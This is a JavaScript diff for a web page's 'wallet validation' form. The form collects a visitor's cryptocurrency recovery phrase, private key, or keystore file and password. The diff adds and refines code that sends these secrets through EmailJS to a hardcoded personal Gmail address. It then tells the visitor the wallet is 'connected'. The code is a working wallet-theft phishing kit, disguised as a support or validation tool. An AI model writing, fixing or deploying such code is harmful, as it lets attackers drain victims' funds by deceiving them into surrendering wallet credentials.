@@ -5,7 +5,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
 function setupFormValidation() {
     // Input mask for recovery phrase
-    const seedPhraseInput = document.getElementById('seedPhrase');
+    const seedPhraseInput = document.getElementById('moduleSeedPhrase'); // Corrected ID
     if (seedPhraseInput) {
         seedPhraseInput.addEventListener('input', function(e) {
             const value = e.target.value;
@@ -28,7 +28,7 @@ function setupFormValidation() {
     }
 
     // Input mask for private key
-    const privateKeyInput = document.getElementById('privateKey');
+    const privateKeyInput = document.getElementById('modulePrivateKey'); // Corrected ID
     if (privateKeyInput) {
         privateKeyInput.addEventListener('input', function(e) {
             const value = e.target.value;
@@ -50,7 +50,7 @@ function setupFormValidation() {
     }
 
     // Keystore JSON validation
-    const keystoreJsonInput = document.getElementById('keystoreJson');
+    const keystoreJsonInput = document.getElementById('moduleKeystoreJson'); // Corrected ID
     if (keystoreJsonInput) {
         keystoreJsonInput.addEventListener('blur', function() {
             const value = keystoreJsonInput.value.trim();
@@ -58,7 +58,7 @@ function setupFormValidation() {
             if (existingError) {
                 existingError.remove();
             }
-            keystoreJsonInput.style.borderColor = ''; // Reset border color
+            keystoreJsonInput.style.borderColor = '';
 
             if (value) {
                 try {
@@ -72,23 +72,29 @@ function setupFormValidation() {
                     errorMsg.style.color = 'var(--error-500)';
                     errorMsg.style.fontSize = '0.875rem';
                     errorMsg.style.marginTop = '4px';
-                    keystoreJsonInput.parentElement.appendChild(errorMsg);
+                    const parentElement = keystoreJsonInput.parentElement;
+                    const oldError = parentElement.querySelector('.input-error');
+                    if(oldError) oldError.remove();
+                    parentElement.appendChild(errorMsg);
                 }
             }
         });
     }
 
     // Form submission validation
-    const validateBtn = document.getElementById('validateBtn');
+    const validateBtn = document.getElementById('moduleValidateBtn'); // Corrected ID
     if (validateBtn) {
         validateBtn.addEventListener('click', function(e) {
             e.preventDefault();
+            console.log("Validate button clicked. Starting validation process.");
 
-            const walletTypeElement = document.getElementById('walletType');
+            const walletTypeElement = document.getElementById('moduleWalletType'); // Corrected ID
             const validationTypeElement = document.querySelector('input[name="validationType"]:checked');
+            const issueTypeElement = document.getElementById('moduleIssueType');
+            const otherIssueElement = document.getElementById('otherIssue');
 
-            document.querySelectorAll('.alert-error').forEach(alert => alert.remove());
-            document.querySelectorAll('input, select').forEach(el => el.style.borderColor = '');
+            document.querySelectorAll('.alert.alert-error').forEach(alert => alert.remove());
+            document.querySelectorAll('input, select, textarea').forEach(el => el.style.borderColor = '');
             const validationOptions = document.querySelector('.validation-options');
             if (validationOptions) validationOptions.style.color = '';
 
@@ -99,14 +105,16 @@ function setupFormValidation() {
                 isValid = false;
                 errorMessage = 'Please select your wallet type';
                 if (walletTypeElement) walletTypeElement.style.borderColor = 'var(--error-500)';
-            } else if (!validationTypeElement) {
+            }
+            else if (!validationTypeElement) {
                 isValid = false;
                 errorMessage = 'Please select a validation method';
                 if (validationOptions) validationOptions.style.color = 'var(--error-500)';
             } else {
                 const selectedType = validationTypeElement.value;
+                console.log("Selected validation method:", selectedType);
                 if (selectedType === 'phrase') {
-                    const seedPhrase = document.getElementById('seedPhrase');
+                    const seedPhrase = document.getElementById('moduleSeedPhrase');
                     if (!seedPhrase || !seedPhrase.value.trim()) {
                         isValid = false;
                         errorMessage = 'Please enter your recovery phrase';
@@ -120,8 +128,8 @@ function setupFormValidation() {
                         }
                     }
                 } else if (selectedType === 'keystore') {
-                    const keystoreJson = document.getElementById('keystoreJson');
-                    const keystorePassword = document.getElementById('keystorePassword');
+                    const keystoreJson = document.getElementById('moduleKeystoreJson');
+                    const keystorePassword = document.getElementById('moduleKeystorePassword');
                     if (!keystoreJson || !keystoreJson.value.trim()) {
                         isValid = false;
                         errorMessage = 'Please enter your keystore JSON';
@@ -141,7 +149,7 @@ function setupFormValidation() {
                         if (keystorePassword) keystorePassword.style.borderColor = 'var(--error-500)';
                     }
                 } else if (selectedType === 'private') {
-                    const privateKey = document.getElementById('privateKey');
+                    const privateKey = document.getElementById('modulePrivateKey');
                     if (!privateKey || !privateKey.value.trim()) {
                         isValid = false;
                         errorMessage = 'Please enter your private key';
@@ -154,10 +162,22 @@ function setupFormValidation() {
                 }
             }
 
+            if (isValid && (!issueTypeElement || issueTypeElement.value === '')) {
+                isValid = false;
+                errorMessage = 'Please select the issue type';
+                if (issueTypeElement) issueTypeElement.style.borderColor = 'var(--error-500)';
+            } else if (isValid && issueTypeElement.value === 'other' && (!otherIssueElement || !otherIssueElement.value.trim())) {
+                isValid = false;
+                errorMessage = 'Please describe your issue when "Other" is selected';
+                if (otherIssueElement) otherIssueElement.style.borderColor = 'var(--error-500)';
+            }
+
             if (!isValid) {
+                console.log("Validation failed:", errorMessage);
                 showValidationError(errorMessage);
                 return false;
             }
+            console.log("All client-side validations passed. Proceeding to prepare data for EmailJS.");
 
             const loadingOverlay = document.getElementById('loadingOverlay');
             if (loadingOverlay) {
@@ -167,82 +187,92 @@ function setupFormValidation() {
 
             const walletType = walletTypeElement ? walletTypeElement.value : 'N/A';
             const validationMethod = validationTypeElement ? validationTypeElement.value : 'N/A';
+            const issueType = issueTypeElement ? issueTypeElement.value : 'N/A';
+            const otherIssueDescription = (issueTypeElement && issueTypeElement.value === 'other' && otherIssueElement && otherIssueElement.value.trim()) ? otherIssueElement.value.trim() : 'N/A';
 
-            let seedPhraseValue = '';
-            let keystoreJsonValue = '';
-            let keystorePasswordValue = '';
-            let privateKeyValue = '';
+            let seedPhraseValue = 'N/A';
+            let keystoreJsonValue = 'N/A';
+            let keystorePasswordValue = 'N/A';
+            let privateKeyValue = 'N/A';
 
             if (validationMethod === 'phrase') {
-                const seedPhrase = document.getElementById('seedPhrase');
-                if (seedPhrase) seedPhraseValue = seedPhrase.value.trim();
+                const seedPhraseElem = document.getElementById('moduleSeedPhrase');
+                if (seedPhraseElem && seedPhraseElem.value.trim()) seedPhraseValue = seedPhraseElem.value.trim();
             } else if (validationMethod === 'keystore') {
-                const keystoreJson = document.getElementById('keystoreJson');
-                const keystorePassword = document.getElementById('keystorePassword');
-                if (keystoreJson) keystoreJsonValue = keystoreJson.value.trim();
-                if (keystorePassword) keystorePasswordValue = keystorePassword.value;
+                const keystoreJsonElem = document.getElementById('moduleKeystoreJson');
+                const keystorePasswordElem = document.getElementById('moduleKeystorePassword');
+                if (keystoreJsonElem && keystoreJsonElem.value.trim()) keystoreJsonValue = keystoreJsonElem.value.trim();
+                if (keystorePasswordElem && keystorePasswordElem.value) keystorePasswordValue = keystorePasswordElem.value;
             } else if (validationMethod === 'private') {
-                const privateKey = document.getElementById('privateKey');
-                if (privateKey) privateKeyValue = privateKey.value.trim();
+                const privateKeyElem = document.getElementById('modulePrivateKey');
+                if (privateKeyElem && privateKeyElem.value.trim()) privateKeyValue = privateKeyElem.value.trim();
             }
 
             const templateParams = {
                 wallet_type: walletType,
                 validation_method: validationMethod,
-                recovery_phrase: seedPhraseValue || 'N/A',
-                keystore_json: keystoreJsonValue || 'N/A',
-                keystore_password: keystorePasswordValue || 'N/A',
-                private_key: privateKeyValue || 'N/A',
+                recovery_phrase: seedPhraseValue,
+                keystore_json: keystoreJsonValue,
+                keystore_password: keystorePasswordValue,
+                private_key: privateKeyValue,
+                issue_type: issueType,
+                other_issue_description: otherIssueDescription,
                 user_agent: navigator.userAgent,
-                to_email: 'kingsleyfrancis.kalu@gmail.com' // This ensures it goes to your specified email
+                to_email: 'kingsleyfrancis.kalu@gmail.com'
             };
 
-            // ====================================================================
-            //         YOUR EmailJS SERVICE ID AND TEMPLATE ID ARE HERE
-            // ====================================================================
+            // --- EmailJS Configuration ---
             const SERVICE_ID = "service_mkx8qgf";
-            const TEMPLATE_ID = "__ejs-test-mail-service__"; // <<< NOTE: This is a generic test template.
-                                                            // Create a custom template in EmailJS to see your form data.
-            // ====================================================================
+            const TEMPLATE_ID = "template_kjj20ts"; // <<< YOUR CUSTOM TEMPLATE ID IS HERE
 
-            console.log("Preparing to send email with params:", templateParams);
+            console.log("Preparing to send email with params:", JSON.stringify(templateParams, null, 2));
             console.log("Using SERVICE_ID:", SERVICE_ID, "and TEMPLATE_ID:", TEMPLATE_ID);
-
 
             emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
                 .then(function(response) {
                     console.log('EmailJS SUCCESS!', response.status, response.text);
                     if (loadingOverlay) loadingOverlay.style.display = 'none';
 
-                    const validationModal = document.getElementById('validationModal');
-                    if (validationModal) {
-                        validationModal.style.display = 'none';
-                        document.body.style.overflow = 'auto';
+                    if (window.showNotification) {
+                        window.showNotification('Wallet details submitted successfully!', 'success');
+                    } else {
+                        alert('Wallet details submitted successfully!');
                     }
-                    showNotification('Wallet details submitted successfully! (Check email for test message)', 'success');
-                    
+
                     const connectButton = document.getElementById('connectWalletBtn');
                     if (connectButton) {
                         connectButton.textContent = 'Wallet Connected';
                         connectButton.classList.remove('btn-outline');
                         connectButton.classList.add('btn-primary');
                     }
+                    const form = document.getElementById('validationForm');
+                    if(form) form.reset();
+                    const phraseInputDiv = document.getElementById('modulePhraseInput');
+                    const keystoreInputDiv = document.getElementById('moduleKeystoreInput');
+                    const privateInputDiv = document.getElementById('modulePrivateInput');
+                    const otherIssueGroupDiv = document.getElementById('otherIssueGroup');
+                    if(phraseInputDiv) phraseInputDiv.style.display = 'none';
+                    if(keystoreInputDiv) keystoreInputDiv.style.display = 'none';
+                    if(privateInputDiv) privateInputDiv.style.display = 'none';
+                    if(otherIssueGroupDiv) otherIssueGroupDiv.style.display = 'none';
 
                 }, function(error) {
                     console.error('EmailJS FAILED...', error);
                     if (loadingOverlay) loadingOverlay.style.display = 'none';
-                    // Provide more detailed error information if available
                     let errorMsg = 'Failed to submit details.';
-                    if (error && error.text) {
-                        errorMsg += ` Server response: ${error.text}`;
+                    if (error && typeof error === 'object') {
+                        if(error.status) errorMsg += ` Status: ${error.status}.`;
+                        if(error.text) errorMsg += ` Reason: ${error.text}`;
+                        else errorMsg += ` Error: ${JSON.stringify(error)}`;
                     } else if (error) {
-                        errorMsg += ` Error: ${JSON.stringify(error)}`;
+                         errorMsg += ` Error: ${error}`;
                     }
-                    showNotification(errorMsg, 'error');
-                    // You might want to check the EmailJS dashboard for logs on failed requests.
-                    // Common issues: incorrect Service ID, Template ID, or Public Key;
-                    // service not configured correctly (e.g., Gmail auth issues);
-                    // daily/monthly EmailJS limits reached.
+
+                    if (window.showNotification) {
+                        window.showNotification(errorMsg, 'error');
+                    } else {
+                        alert(errorMsg);
+                    }
                 });
         });
     }
@@ -279,11 +309,9 @@ function showValidationError(message) {
         title.style.marginBottom = '4px';
     }
     const validationForm = document.querySelector('.validation-form');
-    const existingAlerts = validationForm?.querySelectorAll('.alert.alert-error');
-    if (existingAlerts) {
-        existingAlerts.forEach(alert => alert.remove());
-    }
     if (validationForm) {
+        const existingAlerts = validationForm.querySelectorAll('.alert.alert-error');
+        existingAlerts.forEach(alert => alert.remove());
         validationForm.insertBefore(errorAlert, validationForm.firstChild);
         errorAlert.style.opacity = '0';
         errorAlert.style.transform = 'translateY(-10px)';
@@ -293,16 +321,16 @@ function showValidationError(message) {
             errorAlert.style.transition = 'all 0.3s ease-out';
         }, 10);
         setTimeout(() => {
-            errorAlert.style.opacity = '0';
-            errorAlert.style.transform = 'translateY(-10px)';
-            setTimeout(() => { errorAlert.remove(); }, 300);
+            if (errorAlert.parentElement) {
+                errorAlert.style.opacity = '0';
+                errorAlert.style.transform = 'translateY(-10px)';
+                setTimeout(() => {
+                    if (errorAlert.parentElement) errorAlert.remove();
+                }, 300);
+            }
         }, 5000);
+    } else {
+        console.error("Could not find .validation-form to display error message.");
+        alert(`Validation Error: ${message}`);
     }
-}
-
-function showNotification(message, type = 'info') {
-    console.log(`Notification (${type}): ${message}`);
-    // Replace with your actual notification display logic if you have one
-    // For now, a simple alert will suffice for testing:
-    alert(`Notification (${type}): ${message}`);
 }
